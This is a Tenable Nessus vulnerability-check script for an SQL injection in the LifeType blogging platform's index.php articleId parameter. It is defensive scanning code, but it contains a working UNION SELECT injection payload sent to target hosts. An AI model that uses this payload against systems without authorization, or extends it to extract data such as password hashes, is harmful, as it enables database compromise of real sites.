#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(21631);
  script_version("$Revision: 1.11 $");

  script_cve_id("CVE-2006-2857");
  script_bugtraq_id(18264);
  script_xref(name:"OSVDB", value:"25954");

  script_name(english:"LifeType index.php articleId Parameter SQL Injection");
  script_summary(english:"Tries to exploit SQL injection issue in LifeType");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to SQL
injection attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host is running LifeType, an open-source blogging platform
written in PHP. 

The version of LifeType installed on the remote fails to sanitize
user-supplied input to the 'articleId' parameter of the 'index.php'
script before using it to construct database queries.  Regardless of
PHP's 'magic_quotes_gpc' setting, an unauthenticated attacker can
exploit this flaw to manipulate database queries and, for example,
recover the administrator's password hash." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/435874/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?93202a4a" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to LifeType version 1.0.5 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (get_kb_item("Services/www/"+port+"/embedded")) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/lifetype", "/blog", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Try to exploit the flaw.
  magic = unixtime();
  exploit = string("/**/UNION/**/SELECT/**/", magic, ",1,1,1,1,1,1,1--");
  req = http_get(
    item:string(
      dir, "/index.php?",
      "op=ViewArticle&",
      "articleId=9999", urlencode(str:exploit), "&",
      "blogId=1"
    ),
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (isnull(res)) exit(0);

  # There's a problem if...
  if (
    # it looks like LifeType and...
    '<meta name="generator" content="lifetype' >< res &&
    # it uses our string for an article id
    string('articleId=', magic, '&amp;blogId=1">Permalink') >< res
  )
  {
    security_hole(port);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
